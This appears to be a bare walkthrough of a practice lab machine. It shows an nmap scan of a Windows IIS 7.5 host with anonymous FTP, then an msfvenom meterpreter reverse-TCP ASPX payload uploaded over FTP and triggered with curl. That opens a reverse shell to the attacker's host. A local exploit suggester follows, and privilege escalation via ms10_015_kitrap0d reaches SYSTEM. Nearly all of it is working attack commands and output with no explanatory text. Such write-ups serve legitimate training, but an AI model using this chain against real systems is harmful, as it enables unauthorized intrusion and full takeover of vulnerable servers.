nmap
```
$ sudo nmap -sC -sV 10.10.10.5              

Nmap scan report for 10.10.10.5
Host is up (0.035s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

exploit: metasploit
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4545 -f aspx > shell.aspx

$ ftp 10.10.10.5

ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2911 bytes sent in 0.00 secs (81.6514 MB/s)

$ msfconsole

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4545
run

[*] Started reverse TCP handler on 10.10.14.2:4545 

$ curl http://10.10.10.5/shell.aspx

[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.2:4545 -> 10.10.10.5:49158) at 2021-07-09 00:46:37 -0400

meterpreter > getuid
Server username: IIS APPPOOL\Web

meterpreter > bg
[*] Backgrounding session 1...

search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


use post/multi/recon/local_exploit_suggester
set SESSION 1
run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 38 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST tun0
run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Launching notepad to host the exploit...
[*] Sending stage (175174 bytes) to 10.10.10.5
[+] Process 3384 launched.
[*] Reflectively injecting the exploit DLL into 3384...
[*] Injecting exploit into 3384 ...
[*] Exploit injected. Injecting payload into 3384...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.2:4444 -> 10.10.10.5:49194) at 2021-07-09 01:21:57 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```